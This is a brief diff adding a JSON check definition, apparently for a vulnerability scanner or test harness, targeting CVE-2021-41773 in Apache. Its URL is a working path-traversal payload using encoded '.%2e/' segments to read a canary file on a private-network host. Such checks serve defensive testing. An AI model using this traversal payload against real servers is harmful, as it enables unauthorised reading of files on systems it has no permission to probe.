@@ -1,0 +1,5 @@
+{
+  "check_id": "cve-2021-41773-traversal",
+  "expected_seq": 1,
+  "url": "http://10.114.59.31/static/.%2e/.%2e/srv/canary/canary.txt"
+}
